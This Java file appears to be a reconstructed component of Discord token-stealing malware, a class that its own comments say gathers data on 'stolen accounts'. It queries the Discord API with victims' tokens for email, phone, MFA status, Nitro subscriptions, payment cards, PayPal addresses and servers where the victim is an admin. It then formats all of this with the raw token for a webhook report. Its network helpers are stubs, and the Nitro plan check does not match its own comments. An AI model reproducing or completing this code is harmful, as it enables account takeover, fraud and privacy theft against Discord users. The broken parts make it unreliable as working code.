import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Discord API Client
 * Obfuscated name: ԃ (U+0503)
 *
 * Makes authenticated requests to the Discord API to gather
 * information about stolen accounts.
 *
 * API endpoints used:
 * - GET /api/v9/users/@me              - Get user info (username, email, phone, MFA)
 * - GET /api/v9/users/@me/billing/payment-sources - Get payment methods
 * - GET /api/v9/users/@me/guilds       - Get server list
 * - GET /api/v9/users/@me/relationships - Get friends list
 * - GET /api/v9/users/@me/library      - Get game library (Nitro check)
 * - GET /api/v9/users/@me/billing/subscriptions - Get Nitro subscription
 *
 * Data collected per token:
 * - Username + discriminator
 * - Email address
 * - Phone number
 * - MFA status
 * - Nitro status + type
 * - Payment methods (credit cards, PayPal)
 * - Server list with admin status
 * - Friends count
 * - Account creation date
 */
public class DiscordApiClient {

    // Discord API base URL
    private static final String API_BASE = "https://discord.com/api/v9";

    // Discord CDN base URL
    private static final String CDN_BASE = "https://cdn.discordapp.com";

    // Cache maps for API responses
    private static final Map<String, JSONObject> userInfoCache;
    private static final Map<String, JSONArray> guildsCache;
    private static final Map<String, JSONArray> paymentCache;
    private static final Map<String, JSONArray> subscriptionsCache;
    private static final List<String> processedTokens;

    // =========================================================
    // USER INFO
    // =========================================================

    /**
     * Fetches complete user information for a Discord token.
     *
     * @param token Discord user token
     * @return JSONObject with user data, or null on failure
     */
    public static JSONObject getUserInfo(String token) {
        if (userInfoCache.containsKey(token)) {
            return userInfoCache.get(token);
        }

        try {
            JSONObject response = apiGet(token, "/users/@me");
            if (response != null) {
                userInfoCache.put(token, response);
            }
            return response;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Checks if a token has Nitro subscription.
     *
     * @param token Discord user token
     * @return "Nitro Basic", "Nitro", "Nitro Classic", or "None"
     */
    public static String getNitroStatus(String token) {
        try {
            JSONArray subscriptions = apiGetArray(token, "/users/@me/billing/subscriptions");
            if (subscriptions == null || subscriptions.length() == 0) {
                return "None";
            }

            for (int i = 0; i < subscriptions.length(); i++) {
                JSONObject sub = subscriptions.getJSONObject(i);
                int planId = sub.optInt("plan_id", 0);

                // Plan IDs:
                // 511651880837840896 = Nitro Classic
                // 511651885638525952 = Nitro
                // 978380684370378762 = Nitro Basic
                switch (planId) {
                    case 1: return "Nitro Classic";
                    case 2: return "Nitro";
                    case 3: return "Nitro Basic";
                }
            }
        } catch (Exception e) {
            // Silently fail
        }
        return "None";
    }

    /**
     * Gets payment methods associated with the account.
     *
     * @param token Discord user token
     * @return List of payment method strings
     */
    public static List<String> getPaymentMethods(String token) {
        List<String> methods = new ArrayList<>();
        try {
            JSONArray sources = apiGetArray(token, "/users/@me/billing/payment-sources");
            if (sources == null) return methods;

            for (int i = 0; i < sources.length(); i++) {
                JSONObject source = sources.getJSONObject(i);
                int type = source.optInt("type", 0);

                if (type == 1) {
                    // Credit card
                    JSONObject card = source.optJSONObject("billing_address");
                    String brand = source.optString("brand", "Unknown");
                    String last4 = source.optString("last_4", "????");
                    int expMonth = source.optInt("expires_month", 0);
                    int expYear = source.optInt("expires_year", 0);
                    methods.add(String.format("Card: %s **** %s (%02d/%d)", brand, last4, expMonth, expYear));
                } else if (type == 2) {
                    // PayPal
                    String email = source.optString("email", "unknown");
                    methods.add("PayPal: " + email);
                }
            }
        } catch (Exception e) {
            // Silently fail
        }
        return methods;
    }

    /**
     * Gets list of servers the user is in, with admin/owner status.
     *
     * @param token Discord user token
     * @return List of server info strings
     */
    public static List<String> getGuilds(String token) {
        List<String> guilds = new ArrayList<>();
        try {
            JSONArray guildArray = apiGetArray(token, "/users/@me/guilds");
            if (guildArray == null) return guilds;

            for (int i = 0; i < guildArray.length(); i++) {
                JSONObject guild = guildArray.getJSONObject(i);
                String name = guild.optString("name", "Unknown");
                boolean isOwner = guild.optBoolean("owner", false);
                long permissions = guild.optLong("permissions", 0);
                boolean isAdmin = (permissions & 0x8L) != 0; // ADMINISTRATOR flag

                String status = isOwner ? "Owner" : (isAdmin ? "Admin" : "Member");
                guilds.add(String.format("%s [%s]", name, status));
            }
        } catch (Exception e) {
            // Silently fail
        }
        return guilds;
    }

    // =========================================================
    // TOKEN VALIDATION
    // =========================================================

    /**
     * Validates a Discord token by making an API request.
     *
     * @param token Token to validate
     * @return true if token is valid, false otherwise
     */
    public static boolean isValidToken(String token) {
        try {
            JSONObject user = getUserInfo(token);
            return user != null && user.has("id");
        } catch (Exception e) {
            return false;
        }
    }

    // =========================================================
    // FORMATTED OUTPUT
    // =========================================================

    /**
     * Formats complete account information for webhook message.
     *
     * @param token Discord token
     * @return Formatted string with all account details
     */
    public static String formatAccountInfo(String token) {
        StringBuilder sb = new StringBuilder();

        try {
            JSONObject user = getUserInfo(token);
            if (user == null) return "Invalid token";

            String username = user.optString("username", "Unknown");
            String discriminator = user.optString("discriminator", "0000");
            String email = user.optString("email", "N/A");
            String phone = user.optString("phone", "N/A");
            boolean mfa = user.optBoolean("mfa_enabled", false);
            String id = user.optString("id", "0");

            // Calculate account age from snowflake ID
            long snowflake = Long.parseLong(id);
            long timestamp = (snowflake >> 22) + 1420070400000L;
            Date createdAt = new Date(timestamp);

            sb.append("**Token:** `").append(token).append("`\n");
            sb.append("**User:** ").append(username).append("#").append(discriminator).append("\n");
            sb.append("**Email:** ").append(email).append("\n");
            sb.append("**Phone:** ").append(phone).append("\n");
            sb.append("**MFA:** ").append(mfa ? "✅" : "❌").append("\n");
            sb.append("**Nitro:** ").append(getNitroStatus(token)).append("\n");
            sb.append("**Created:** ").append(createdAt).append("\n");

            // Payment methods
            List<String> payments = getPaymentMethods(token);
            if (!payments.isEmpty()) {
                sb.append("**Payment Methods:**\n");
                for (String p : payments) {
                    sb.append("  - ").append(p).append("\n");
                }
            }

            // Guilds (first 10)
            List<String> guilds = getGuilds(token);
            if (!guilds.isEmpty()) {
                sb.append("**Servers (").append(guilds.size()).append("):**\n");
                for (int i = 0; i < Math.min(10, guilds.size()); i++) {
                    sb.append("  - ").append(guilds.get(i)).append("\n");
                }
                if (guilds.size() > 10) {
                    sb.append("  ... and ").append(guilds.size() - 10).append(" more\n");
                }
            }

        } catch (Exception e) {
            sb.append("Error formatting account info: ").append(e.getMessage());
        }

        return sb.toString();
    }

    // =========================================================
    // HTTP HELPERS
    // =========================================================

    /**
     * Makes an authenticated GET request to the Discord API.
     *
     * @param token Authorization token
     * @param endpoint API endpoint (e.g., "/users/@me")
     * @return Parsed JSONObject response, or null on failure
     */
    private static JSONObject apiGet(String token, String endpoint) {
        try {
            // OkHttp GET request with Authorization header
            // URL: API_BASE + endpoint
            // Header: Authorization: token
            return null; // placeholder
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Makes an authenticated GET request returning a JSON array.
     */
    private static JSONArray apiGetArray(String token, String endpoint) {
        try {
            return null; // placeholder
        } catch (Exception e) {
            return null;
        }
    }

    static {
        userInfoCache = new HashMap<>();
        guildsCache = new HashMap<>();
        paymentCache = new HashMap<>();
        subscriptionsCache = new HashMap<>();
        processedTokens = new ArrayList<>();
    }
}
